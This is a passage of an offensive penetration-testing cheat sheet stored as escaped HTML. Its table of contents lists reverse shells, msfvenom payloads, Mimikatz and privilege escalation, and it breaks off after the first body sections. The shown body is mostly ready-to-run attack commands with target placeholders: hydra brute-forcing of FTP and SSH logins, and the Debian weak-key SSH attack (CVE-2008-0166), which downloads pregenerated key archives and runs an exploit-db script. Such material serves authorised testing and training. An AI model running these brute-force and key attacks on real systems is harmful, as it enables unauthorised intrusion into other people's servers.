.git\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='extract-git-content';\" href=\"javascript:;\"\u003EExtract .git content\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='hashes';\" href=\"javascript:;\"\u003EHASHES\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-2';\" href=\"javascript:;\"\u003EWindows\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='linux-2';\" href=\"javascript:;\"\u003ELinux\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='mimikatz';\" href=\"javascript:;\"\u003EMIMIKATZ\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='miscellaneous';\" href=\"javascript:;\"\u003EMISCELLANEOUS\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='get-a-windows-path-without-spaces';\" href=\"javascript:;\"\u003EGet a Windows path without spaces\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='msfvenom-payload';\" href=\"javascript:;\"\u003EMSFVENOM PAYLOAD\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='linux-3';\" href=\"javascript:;\"\u003ELinux\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-3';\" href=\"javascript:;\"\u003EWindows\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='php';\" href=\"javascript:;\"\u003EPHP\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='asp';\" href=\"javascript:;\"\u003EASP\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='jsp';\" href=\"javascript:;\"\u003EJSP\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='war';\" href=\"javascript:;\"\u003EWAR\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='python';\" href=\"javascript:;\"\u003EPython\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='bash';\" href=\"javascript:;\"\u003EBash\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='perl';\" href=\"javascript:;\"\u003EPerl\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='listener';\" href=\"javascript:;\"\u003EListener\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='metasploit';\" href=\"javascript:;\"\u003EMetasploit\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='netcat';\" href=\"javascript:;\"\u003ENetcat\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='password-cracking';\" href=\"javascript:;\"\u003EPASSWORD CRACKING\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='online';\" href=\"javascript:;\"\u003EOnline\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='hashcat';\" href=\"javascript:;\"\u003EHashcat\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='linux-password';\" href=\"javascript:;\"\u003ELinux password\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-password';\" href=\"javascript:;\"\u003EWindows password\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='others';\" href=\"javascript:;\"\u003EOthers\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='rules';\" href=\"javascript:;\"\u003ERules\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='john';\" href=\"javascript:;\"\u003EJohn\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='pivoting';\" href=\"javascript:;\"\u003EPIVOTING\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='sshuttle';\" href=\"javascript:;\"\u003ESshuttle\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='proxychains';\" href=\"javascript:;\"\u003EProxychains\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='privile-escalation';\" href=\"javascript:;\"\u003EPRIVILE ESCALATION\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='linux-4';\" href=\"javascript:;\"\u003ELinux\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='enumeration-scripts';\" href=\"javascript:;\"\u003EEnumeration scripts\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='vulnerability-scan';\" href=\"javascript:;\"\u003EVulnerability scan\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='suid-checker';\" href=\"javascript:;\"\u003ESuid checker\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='methodology-to-follow';\" href=\"javascript:;\"\u003EMethodology to follow\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-4';\" href=\"javascript:;\"\u003EWindows\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='enumeration-scripts-1';\" href=\"javascript:;\"\u003EEnumeration scripts\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='general-scans';\" href=\"javascript:;\"\u003EGeneral scans\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='search-for-cve';\" href=\"javascript:;\"\u003ESearch for CVE\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='post-exploitation';\" href=\"javascript:;\"\u003EPost exploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='juicypotato-seimpersonate-or-seassignprimarytoken';\" href=\"javascript:;\"\u003EJuicyPotato (SeImpersonate or SeAssignPrimaryToken)\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='methodology-to-follow-1';\" href=\"javascript:;\"\u003EMethodology to follow\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='autorun';\" href=\"javascript:;\"\u003EAutorun\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='detection';\" href=\"javascript:;\"\u003EDetection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploitation';\" href=\"javascript:;\"\u003EExploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='alwaysinstallelevated';\" href=\"javascript:;\"\u003EAlwaysInstallElevated\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='detection-1';\" href=\"javascript:;\"\u003EDetection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploitation-1';\" href=\"javascript:;\"\u003EExploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='executable-files';\" href=\"javascript:;\"\u003EExecutable Files\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='detection-2';\" href=\"javascript:;\"\u003EDetection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploitation-2';\" href=\"javascript:;\"\u003EExploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='startup-applications';\" href=\"javascript:;\"\u003EStartup applications\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='detection-3';\" href=\"javascript:;\"\u003EDetection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploitation-3';\" href=\"javascript:;\"\u003EExploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='weak-service-permission';\" href=\"javascript:;\"\u003EWeak service permission\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='detection-4';\" href=\"javascript:;\"\u003EDetection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploitation-4';\" href=\"javascript:;\"\u003EExploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='unquoted-service-paths';\" href=\"javascript:;\"\u003EUnquoted service paths\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='detection-5';\" href=\"javascript:;\"\u003EDetection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploitation-5';\" href=\"javascript:;\"\u003EExploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='hot-potato';\" href=\"javascript:;\"\u003EHot potato\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploitation-6';\" href=\"javascript:;\"\u003EExploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='cve';\" href=\"javascript:;\"\u003ECVE\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-xp';\" href=\"javascript:;\"\u003EWindows XP\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-7';\" href=\"javascript:;\"\u003EWindows 7\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-8';\" href=\"javascript:;\"\u003EWindows 8\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-10';\" href=\"javascript:;\"\u003EWindows 10\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-server-2003';\" href=\"javascript:;\"\u003EWindows Server 2003\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='proofs';\" href=\"javascript:;\"\u003EPROOFS\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='linux-5';\" href=\"javascript:;\"\u003ELinux\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-5';\" href=\"javascript:;\"\u003EWindows\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='reverse-shell';\" href=\"javascript:;\"\u003EREVERSE SHELL\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='amazing-tool-for-shell-generation';\" href=\"javascript:;\"\u003EAmazing tool for shell generation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='bash-1';\" href=\"javascript:;\"\u003EBash\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='perl-1';\" href=\"javascript:;\"\u003EPerl\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='python-1';\" href=\"javascript:;\"\u003EPython\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='netcat-1';\" href=\"javascript:;\"\u003ENetcat\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='more-reverse-shell';\" href=\"javascript:;\"\u003EMore reverse shell\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='interactive-shell';\" href=\"javascript:;\"\u003EInteractive shell\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='adjust-interactive-shell';\" href=\"javascript:;\"\u003EAdjust Interactive shell\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='shellshock';\" href=\"javascript:;\"\u003ESHELLSHOCK\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='useful-linux-commands';\" href=\"javascript:;\"\u003EUSEFUL LINUX COMMANDS\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='find-a-file';\" href=\"javascript:;\"\u003EFind a file\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='active-connection';\" href=\"javascript:;\"\u003EActive connection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='list-all-suid-files';\" href=\"javascript:;\"\u003EList all SUID files\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='determine-the-current-version-of-linux';\" href=\"javascript:;\"\u003EDetermine the current version of Linux\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='determine-more-information-about-the-environment';\" href=\"javascript:;\"\u003EDetermine more information about the environment\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='list-processes-running';\" href=\"javascript:;\"\u003EList processes running\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='list-the-allowed-and-forbidden-commands-for-the-invoking-use';\" href=\"javascript:;\"\u003EList the allowed (and forbidden) commands for the invoking use\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='useful-windows-commands';\" href=\"javascript:;\"\u003EUSEFUL WINDOWS COMMANDS\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='zip';\" href=\"javascript:;\"\u003EZIP\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Chr\u003E\n\u003Ch2 id=\"enumeration\"\u003EEnumeration\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enmap -sn -v \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FCIDR\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EnmapAutomator \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E All\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eautorecon \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FCIDR\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"nmap\"\u003ENMAP\u003C\u002Fh2\u003E\n\u003Ch3 id=\"tcp\"\u003ETCP\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esudo -sS -sC -sV -oA \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E.tcp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -v\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"udp\"\u003EUDP\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esudo -sU -sS -sC -sV -oA \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E.udp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -v\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"ftp---21\"\u003EFTP - 21\u003C\u002Fh2\u003E\n\u003Ch3 id=\"brute-force\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -V -f -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E ftp:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u -vV\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"downloading-file\"\u003EDownloading file\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eftp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nPASSIVE\nBINARY\nget \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"uploading-file\"\u003EUploading file\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eftp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nPASSIVE\nBINARY\nput \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"ssh---22\"\u003ESSH - 22\u003C\u002Fh2\u003E\n\u003Ch3 id=\"brute-force-1\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -V -f -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E ssh:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u -vV\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"cve-2008-0166\"\u003ECVE-2008-0166\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EAll SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.\n\nhttps:\u002F\u002Fwww.exploit-db.com\u002Fexploits\u002F5720\n\nwget https:\u002F\u002Fgithub.com\u002Fg0tmi1k\u002Fdebian-ssh\u002Fraw\u002Fmaster\u002Fcommon_keys\u002Fdebian_ssh_rsa_2048_x86.tar.bz2 https:\u002F\u002Fgithub.com\u002Fg0tmi1k\u002Fdebian-ssh\u002Fraw\u002Fmaster\u002Fcommon_keys\u002Fdebian_ssh_dsa_1024_x86.tar.bz2\n\nbunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2\ntar -xvf debian_ssh_rsa_2048_x86.tar\ntar -xvf debian_ssh_dsa_1024_x86.tar\n\npython 5720 rsa\u002F2048 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETHREADS\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\npython 5720 dsa\u002F1024 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETHREADS\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 